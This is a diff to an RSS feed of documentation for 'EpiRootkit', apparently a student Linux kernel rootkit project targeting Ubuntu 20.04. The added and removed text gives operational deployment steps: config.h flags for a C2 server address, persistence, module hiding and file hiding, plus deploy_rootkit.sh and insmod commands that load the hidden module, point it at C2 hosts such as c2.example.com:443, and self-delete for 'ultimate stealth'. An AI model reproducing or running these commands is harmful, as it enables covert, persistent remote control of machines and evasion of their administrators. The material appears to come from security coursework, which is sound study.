@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>EpiRootkit on Tux Fan Club Docs</title><link>/docs/05-epirootkit/</link><description>Recent content in EpiRootkit on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Fri, 30 May 2025 20:52:51 +0200</lastBuildDate><atom:link href="/docs/05-epirootkit/index.xml" rel="self" type="application/rss+xml"/><item><title>Configuration Justifications</title><link>/docs/05-epirootkit/configuration-justifications/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/05-epirootkit/configuration-justifications/</guid><description>&lt;h2 id="target-environment">Target Environment &lt;a href="#target-environment" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>EpiRootkit on Tux Fan Club Docs</title><link>/docs/05-epirootkit/</link><description>Recent content in EpiRootkit on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Sat, 31 May 2025 18:51:21 +0200</lastBuildDate><atom:link href="/docs/05-epirootkit/index.xml" rel="self" type="application/rss+xml"/><item><title>Configuration Justifications</title><link>/docs/05-epirootkit/configuration-justifications/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/05-epirootkit/configuration-justifications/</guid><description>&lt;h2 id="target-environment">Target Environment &lt;a href="#target-environment" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
 &lt;li>&lt;strong>OS&lt;/strong>: Ubuntu 20.04 LTS (Focal Fossa)&lt;/li>
 &lt;li>&lt;strong>Kernel&lt;/strong>: 5.4.0-26-generic&lt;/li>
 &lt;/ul>
@@ -115,7 +115,6 @@ status Client-1
 &lt;h2 id="requirements">Requirements &lt;a href="#requirements" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="system">System &lt;a href="#system" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
 &lt;li>&lt;strong>OS&lt;/strong>: Ubuntu 20.04 LTS&lt;/li>
 &lt;li>&lt;strong>Kernel&lt;/strong>: 5.4.0-* (check with &lt;code>uname -r&lt;/code>)&lt;/li>
-&lt;li>&lt;strong>Architecture&lt;/strong>: x86_64&lt;/li>
 &lt;/ul>
 &lt;h3 id="dependencies">Dependencies &lt;a href="#dependencies" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
@@ -137,38 +136,6 @@ status Client-1
 sudo apt install -y build-essential linux-headers-$(uname -r)&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h2 id="configuration">Configuration &lt;a href="#configuration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Edit &lt;code>rootkit/core/config.h&lt;/code> before building:&lt;/p>
-
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="6fe5c17" class="language-c ">
- &lt;code>// Option 1: Domain name (recommended)
-#define C2_SERVER_ADDRESS &amp;#34;jules-c2.example.com&amp;#34;
-#define C2_SERVER_PORT 4444
-
-// Option 2: IP address (traditional)
-#define C2_SERVER_ADDRESS &amp;#34;192.168.64.1&amp;#34;
-#define C2_SERVER_PORT 4444
-
-// Feature settings
-#define ENABLE_ENCRYPTION 1 // XOR encryption enabled
-#define ENABLE_PERSISTENCE 1 // Auto-install persistence
-#define ENABLE_MODULE_HIDING 1 // Hide module by default
-#define ENABLE_FILE_HIDING 1 // Hide files with prefixes&lt;/code>
- &lt;/pre>
- &lt;/div>
 &lt;h2 id="build">Build &lt;a href="#build" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 
 
@@ -184,13 +151,13 @@ sudo apt install -y build-essential linux-headers-$(uname -r)&lt;/code>
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="f9e9859" class="language-bash ">
+ &lt;pre id="eef045c" class="language-bash ">
  &lt;code>cd rootkit
 make clean &amp;amp;&amp;amp; make
 # ✓ Build successful: epirootkit.ko created&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h2 id="deployment">Deployment &lt;a href="#deployment" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="quick-deploy-recommended">Quick Deploy (Recommended) &lt;a href="#quick-deploy-recommended" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+&lt;h2 id="deployment">Deployment &lt;a href="#deployment" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="deployment-script">Deployment Script &lt;a href="#deployment-script" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
 
  
@@ -205,18 +172,50 @@ make clean &amp;amp;&amp;amp; make
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="ffdc55b" class="language-bash ">
- &lt;code># Deploy with domain name
+ &lt;pre id="b8525b1" class="language-bash ">
+ &lt;code># Default usage (uses ./epirootkit.ko automatically)
+sudo ./deploy_rootkit.sh
+
+# Custom C2 server
+sudo ./deploy_rootkit.sh ./epirootkit.ko address=192.168.200.11 port=4444
+
+# Domain-based deployment
 sudo ./deploy_rootkit.sh address=jules_chef_de_majeur.epirootkit.com
 
-# Deploy with IP address
-sudo ./deploy_rootkit.sh address=192.168.1.100 port=4444
+# Stealth deployment with self-cleanup
+sudo ./deploy_rootkit.sh --self-delete
 
-# Deploy with defaults from config.h
-sudo ./deploy_rootkit.sh&lt;/code>
+# Verbose deployment (show output)
+sudo ./deploy_rootkit.sh --verbose&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h3 id="manual-loading">Manual Loading &lt;a href="#manual-loading" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+&lt;h3 id="deployment-options">Deployment Options &lt;a href="#deployment-options" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Option&lt;/th>
+ &lt;th>Description&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;code>--verbose&lt;/code>&lt;/td>
+ &lt;td>Show detailed output during deployment&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;code>--self-delete&lt;/code>&lt;/td>
+ &lt;td>Remove script after successful deployment&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;code>status&lt;/code>&lt;/td>
+ &lt;td>Check current deployment status&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;code>uninstall&lt;/code>&lt;/td>
+ &lt;td>Remove module and cleanup&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;h3 id="advanced-usage">Advanced Usage &lt;a href="#advanced-usage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
 
  
@@ -231,64 +230,50 @@ sudo ./deploy_rootkit.sh&lt;/code>
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="b5259ca" class="language-bash ">
+ &lt;pre id="284770d" class="language-bash ">
+ &lt;code># Ultimate stealth deployment
+sudo ./deploy_rootkit.sh address=c2.example.com port=443 --self-delete
+
+# Deploy with verbose output then self-destruct
+sudo ./deploy_rootkit.sh --verbose --self-delete
+
+# Check deployment status
+sudo ./deploy_rootkit.sh status
+# Status: Active (hidden)
+# Note: Persistence is managed internally by the rootkit
+
+# Remove deployment
+sudo ./deploy_rootkit.sh uninstall
+# Module uninstalled&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h3 id="manual-loading-alternative">Manual Loading (Alternative) &lt;a href="#manual-loading-alternative" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="7e16c96" class="language-bash ">
  &lt;code># Load with domain
-sudo insmod epirootkit.ko address=jules_chef_de_majeur.epirootkit.com
+sudo insmod epirootkit.ko address=jules-c2.example.com
 
 # Load with IP
-sudo insmod epirootkit.ko address=192.168.1.100 port=4444
+sudo insmod epirootkit.ko address=192.168.200.11 port=4444
 
-# Load with defaults
+# Load with defaults from config.h
 sudo insmod epirootkit.ko&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h2 id="management">Management &lt;a href="#management" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="check-status">Check Status &lt;a href="#check-status" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="ab56047" class="language-bash ">
- &lt;code>sudo ./deploy_rootkit.sh status
-# Module Status: LOADED
-# Location: /lib/modules/5.4.0-74-generic/extra/epirootkit.ko
-# Autoload: ENABLED (/etc/modules-load.d/epirootkit.conf)
-# Connection: CONNECTED (c2.example.com:443)&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;h3 id="complete-removal">Complete Removal &lt;a href="#complete-removal" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="5ba7b2a" class="language-bash ">
- &lt;code>sudo ./deploy_rootkit.sh uninstall
-# ✓ Module unloaded
-# ✓ Autoload disabled
-# ✓ Module file removed
-# ✓ Dependencies updated&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;p>&lt;strong>Domain Support&lt;/strong>: The rootkit supports both domain names and IP addresses. For DNS resolution details, see &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/05-epirootkit/features/dns-resolution/'>&lt;p>FEATURES&lt;/p></description></item><item><title>Connection &amp; Authentication</title><link>/docs/05-epirootkit/connection-authentication/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/05-epirootkit/connection-authentication/</guid><description>&lt;h1 id="connection--authentication">Connection &amp;amp; Authentication &lt;a href="#connection--authentication" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>How EpiRootkit connects to the C2 server and handles authentication with &lt;strong>domain support&lt;/strong> and &lt;strong>XOR encryption&lt;/strong>.&lt;/p>
+&lt;h2 id="self-cleanup-features">Self-Cleanup Features &lt;a href="#self-cleanup-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>The deployment script includes advanced stealth capabilities:&lt;/p></description></item><item><title>Connection &amp; Authentication</title><link>/docs/05-epirootkit/connection-authentication/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/05-epirootkit/connection-authentication/</guid><description>&lt;h1 id="connection--authentication">Connection &amp;amp; Authentication &lt;a href="#connection--authentication" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>How EpiRootkit connects to the C2 server and handles authentication with &lt;strong>domain support&lt;/strong> and &lt;strong>XOR encryption&lt;/strong>.&lt;/p>
 &lt;h2 id="connection-process">Connection Process &lt;a href="#connection-process" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>When the rootkit loads, it automatically:&lt;/p>
 &lt;ol>
 &lt;li>&lt;strong>Starts connection thread&lt;/strong> (&lt;code>epirootkit_conn&lt;/code>)&lt;/li>
